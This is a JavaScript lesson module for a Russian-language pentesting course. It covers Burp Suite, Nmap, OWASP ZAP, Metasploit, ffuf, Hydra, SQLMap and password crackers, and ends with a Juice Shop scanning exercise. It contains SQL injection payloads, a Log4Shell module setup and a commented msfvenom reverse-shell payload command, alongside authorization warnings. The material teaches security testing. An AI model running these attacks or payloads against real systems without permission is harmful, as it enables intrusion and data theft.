export default {
  id: 19,
  title: 'Пентест: инструменты',
  description: 'Burp Suite, Nmap, Metasploit, OWASP ZAP — основные инструменты пентестера для тестирования безопасности.',
  lessons: [
    {
      id: 1,
      title: 'Burp Suite: перехват и анализ HTTP',
      type: 'theory',
      content: [
        { type: 'text', value: 'Burp Suite — основной инструмент для тестирования веб-приложений. Proxy перехватывает HTTP трафик между браузером и сервером, позволяя анализировать и модифицировать запросы. Community Edition бесплатна.' },
        { type: 'heading', value: 'Основные компоненты Burp Suite' },
        { type: 'list', value: [
          'Proxy — перехват и модификация HTTP запросов/ответов',
          'Repeater — повторная отправка модифицированных запросов',
          'Intruder — автоматизированный перебор (brute force, fuzzing)',
          'Scanner — автоматический поиск уязвимостей (Pro версия)',
          'Decoder — кодирование/декодирование (Base64, URL, HTML)',
          'Comparer — сравнение запросов/ответов'
        ]},
        { type: 'code', language: 'bash', value: '# === Настройка Burp Suite ===\n\n# 1. Запустите Burp Suite\n# 2. Proxy -> Options -> Proxy Listeners: 127.0.0.1:8080\n# 3. Настройте браузер на прокси 127.0.0.1:8080\n#    Или используйте FoxyProxy расширение\n\n# 4. Установите CA сертификат Burp:\n#    Откройте http://burp в браузере (через прокси)\n#    Скачайте CA Certificate\n#    Импортируйте в браузер: Settings -> Certificates -> Import\n\n# === Workflow тестирования ===\n\n# 1. Intercept Off: исследуйте приложение, Burp записывает всё\n# 2. Изучите Site Map: все endpoints, параметры, формы\n# 3. Intercept On: перехватите интересный запрос\n# 4. Send to Repeater: модифицируйте и повторите\n# 5. Send to Intruder: автоматизируйте перебор\n\n# Пример: тестирование SQL injection через Repeater\n# Оригинальный запрос:\n# GET /api/users?id=1\n# Модифицированный:\n# GET /api/users?id=1 OR 1=1\n# GET /api/users?id=1\' UNION SELECT null,null--\n# Анализируем ответы на каждый payload' },
        { type: 'tip', value: 'Начните с пассивного исследования (Intercept off, изучите Site Map). Затем целенаправленно тестируйте каждый параметр. Repeater — самый используемый инструмент при ручном тестировании.' }
      ]
    },
    {
      id: 2,
      title: 'Nmap: расширенное сканирование',
      type: 'theory',
      content: [
        { type: 'text', value: 'Nmap — мощный сканер портов и сервисов. NSE (Nmap Scripting Engine) расширяет возможности: определение уязвимостей, brute force, обнаружение malware. Используется в каждом пентесте.' },
        { type: 'code', language: 'bash', value: '# === Nmap: продвинутое использование ===\n\n# SYN scan (stealth, требует root)\nsudo nmap -sS -T4 target.example.com\n\n# Версии сервисов + OS detection + scripts\nsudo nmap -sV -sC -O -T4 target.example.com\n\n# Все TCP порты + agressive\nsudo nmap -p- -A -T4 target.example.com\n\n# UDP scan (медленный, но важный)\nsudo nmap -sU --top-ports 20 target.example.com\n\n# === NSE Scripts ===\n\n# Проверка уязвимостей\nnmap --script vuln target.example.com\n\n# HTTP enumeration\nnmap -p80,443 --script http-enum target.example.com\n# Найдёт: /admin/, /phpmyadmin/, /.git/, /backup/\n\n# SSL/TLS проверка\nnmap --script ssl-enum-ciphers -p 443 target.example.com\n\n# DNS brute force поддоменов\nnmap --script dns-brute target.example.com\n\n# Конкретные проверки\nnmap --script http-sql-injection -p80 target.example.com\nnmap --script http-xssed -p80 target.example.com\n\n# Сохранение результатов\nnmap -sV -sC -oA scan_results target.example.com\n# Создаёт: scan_results.nmap, scan_results.xml, scan_results.gnmap' },
        { type: 'warning', value: 'Nmap scan может быть обнаружен IDS/IPS. Для stealth используйте -sS (SYN scan), -T2 (медленнее). UDP scan (-sU) очень медленный, сканируйте только top ports. Всегда сканируйте ТОЛЬКО авторизованные цели.' }
      ]
    },
    {
      id: 3,
      title: 'OWASP ZAP: автоматизированное тестирование',
      type: 'theory',
      content: [
        { type: 'text', value: 'OWASP ZAP (Zed Attack Proxy) — бесплатная альтернатива Burp Suite Pro. Мощный автоматический сканер, API для автоматизации, поддержка CI/CD. Идеален для DevSecOps.' },
        { type: 'code', language: 'bash', value: '# === OWASP ZAP: режимы работы ===\n\n# 1. Desktop GUI (интерактивное тестирование)\n# Скачать: https://www.zaproxy.org/download/\n\n# 2. Docker: автоматизированные сканы\n\n# Baseline Scan (быстрый, для CI/CD)\ndocker run -t zaproxy/zap-stable zap-baseline.py \\\n  -t https://target.example.com \\\n  -r baseline-report.html\n\n# Full Scan (глубокий, дольше)\ndocker run -t zaproxy/zap-stable zap-full-scan.py \\\n  -t https://target.example.com \\\n  -r full-report.html \\\n  -J full-report.json\n\n# API Scan (для REST API)\ndocker run -t zaproxy/zap-stable zap-api-scan.py \\\n  -t https://target.example.com/openapi.yaml \\\n  -f openapi \\\n  -r api-report.html\n\n# GraphQL Scan\ndocker run -t zaproxy/zap-stable zap-api-scan.py \\\n  -t https://target.example.com/graphql \\\n  -f graphql\n\n# 3. ZAP API (для автоматизации)\n# Запуск ZAP в daemon mode\ndocker run -d -p 8090:8080 zaproxy/zap-stable \\\n  zap.sh -daemon -host 0.0.0.0 -port 8080 \\\n  -config api.key=your-api-key\n\n# Использование API\ncurl "http://localhost:8090/JSON/spider/action/scan/?url=https://target.example.com&apikey=your-api-key"' },
        { type: 'tip', value: 'ZAP Baseline Scan идеален для CI/CD: быстрый (5-10 минут), находит основные проблемы. Full Scan запускайте периодически (еженедельно). API Scan — при изменении API (предоставьте OpenAPI spec).' }
      ]
    },
    {
      id: 4,
      title: 'Metasploit Framework: основы',
      type: 'theory',
      content: [
        { type: 'text', value: 'Metasploit — фреймворк для пентеста с библиотекой эксплойтов, payload и post-exploitation модулей. Используется для демонстрации реальных последствий уязвимостей. Только для авторизованного тестирования!' },
        { type: 'code', language: 'bash', value: '# === Metasploit: основные команды ===\n\n# Запуск\nmsfconsole\n\n# Поиск эксплойтов\nmsf6> search type:exploit platform:linux ssh\nmsf6> search cve:2021-44228  # Log4Shell\n\n# Информация об эксплойте\nmsf6> info exploit/multi/http/log4shell_header_injection\n\n# Использование модуля\nmsf6> use exploit/multi/http/log4shell_header_injection\nmsf6> show options\nmsf6> set RHOSTS target.example.com\nmsf6> set RPORT 8080\nmsf6> set LHOST your-ip\nmsf6> check           # Проверить уязвимость без эксплуатации\n\n# === Auxiliary модули (сканирование, не эксплуатация) ===\nmsf6> use auxiliary/scanner/http/http_version\nmsf6> set RHOSTS target.example.com\nmsf6> run\n\nmsf6> use auxiliary/scanner/ssh/ssh_version\nmsf6> set RHOSTS target.example.com\nmsf6> run\n\n# === Msfvenom: генерация payload ===\n# Только для авторизованного тестирования!\n# msfvenom -p linux/x64/meterpreter/reverse_tcp \\\n#   LHOST=your-ip LPORT=4444 -f elf > payload.bin\n\n# === Metasploit DB ===\n# Импорт результатов nmap\nmsf6> db_import scan_results.xml\nmsf6> hosts\nmsf6> services' },
        { type: 'warning', value: 'Metasploit содержит реальные эксплойты, способные компрометировать системы. Использование против чужих систем без разрешения — УГОЛОВНОЕ ПРЕСТУПЛЕНИЕ. Используйте только в авторизованном пентесте или в лабораторной среде (Metasploitable, VulnHub).' }
      ]
    },
    {
      id: 5,
      title: 'Дополнительные инструменты пентестера',
      type: 'theory',
      content: [
        { type: 'text', value: 'Помимо основных инструментов, пентестер использует специализированные утилиты для конкретных задач: перебор директорий, credential testing, exploiting web vulnerabilities.' },
        { type: 'code', language: 'bash', value: '# === Перечисление (Enumeration) ===\n\n# ffuf: быстрый web fuzzer (директории, параметры)\nffuf -u https://target.example.com/FUZZ \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -mc 200,301,302,403\n\n# Subdomain enumeration\nffuf -u https://FUZZ.example.com \\\n  -w /usr/share/wordlists/subdomains.txt \\\n  -mc 200\n\n# === Credential Testing ===\n\n# Hydra: brute force online services\n# ТОЛЬКО для авторизованного тестирования!\n# hydra -l admin -P /usr/share/wordlists/rockyou.txt \\\n#   target.example.com http-post-form \\\n#   "/login:username=^USER^&password=^PASS^:Invalid credentials"\n\n# === Web Exploitation ===\n\n# SQLMap: автоматизированная SQL injection\n# sqlmap -u "https://target.example.com/search?q=test" --dbs\n# --dbs: перечислить базы данных\n# --tables: перечислить таблицы\n# --dump: извлечь данные\n# ВНИМАНИЕ: может повредить данные! Используйте с осторожностью\n\n# === Password Cracking (офлайн) ===\n\n# John the Ripper\n# john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n\n# Hashcat (GPU ускорение)\n# hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n# -m 3200: bcrypt\n# -a 0: dictionary attack\n\n# === Kali Linux ===\n# Дистрибутив с предустановленными инструментами\n# Все перечисленные инструменты + 600+ других\n# Docker: docker run -it kalilinux/kali-rolling' },
        { type: 'tip', value: 'Kali Linux — стандартный дистрибутив для пентеста. Для начала: Nmap (recon) -> Burp/ZAP (web testing) -> ffuf (enumeration) -> SQLMap (SQL injection). Практикуйтесь на HackTheBox, TryHackMe, VulnHub.' }
      ]
    },
    {
      id: 6,
      title: 'Практика: Сканирование и анализ',
      type: 'practice',
      difficulty: 'medium',
      description: 'Проведите комплексное сканирование учебного веб-приложения (DVWA/Juice Shop) с использованием Nmap, ZAP и анализом результатов.',
      requirements: [
        'Запустите учебное приложение (DVWA или Juice Shop в Docker)',
        'Проведите Nmap сканирование: порты, сервисы, версии',
        'Запустите OWASP ZAP baseline scan',
        'Проанализируйте найденные уязвимости',
        'Составьте краткий отчёт с приоритизацией находок'
      ],
      hint: 'docker run -p 3000:3000 bkimminich/juice-shop для Juice Shop. nmap -sV -sC localhost. ZAP baseline scan через Docker.',
      expectedOutput: 'Juice Shop запущен на localhost:3000\nNmap: Port 3000 open, Node.js Express\nZAP Baseline: 15 alerts (2 High, 5 Medium, 8 Low)\nHigh: Missing Anti-CSRF Tokens, X-Frame-Options not set\nMedium: Cookie without HttpOnly, CSP not set\nОтчёт: приоритизированный список из 15 находок',
      solution: '#!/bin/bash\n# Комплексное сканирование учебного приложения\n\n# 1. Запуск Juice Shop\ndocker run -d --name juice-shop -p 3000:3000 bkimminich/juice-shop\necho "Waiting for Juice Shop to start..."\nsleep 10\n\n# 2. Nmap сканирование\necho "=== Nmap Scan ==="\nnmap -sV -sC -p 3000 localhost\n\n# 3. OWASP ZAP Baseline Scan\necho "\\n=== OWASP ZAP Baseline ==="\ndocker run --rm --network host -t zaproxy/zap-stable \\\n  zap-baseline.py -t http://localhost:3000 \\\n  -r /dev/stdout 2>/dev/null | head -50\n\n# 4. Проверка security headers\necho "\\n=== Security Headers ==="\ncurl -sI http://localhost:3000 | grep -iE "x-frame|content-security|strict-transport|x-content-type"\n\n# 5. Отчёт\necho "\\n=== Отчёт ==="\necho "Target: OWASP Juice Shop (localhost:3000)"\necho "Date: $(date)"\necho "\\nFindings:"\necho "HIGH: Missing CSRF protection"\necho "HIGH: No X-Frame-Options header"\necho "MEDIUM: Cookies without HttpOnly flag"\necho "MEDIUM: No Content-Security-Policy"\necho "LOW: Server information disclosure"\n\n# Cleanup\ndocker stop juice-shop && docker rm juice-shop',
      explanation: 'Комплексное сканирование начинается с Nmap (какие порты открыты, какие сервисы), затем ZAP находит веб-уязвимости автоматически. Ручной анализ (security headers, cookies) дополняет автоматическое сканирование. Результаты приоритизируются по severity и формируют план исправления.'
    }
  ]
}
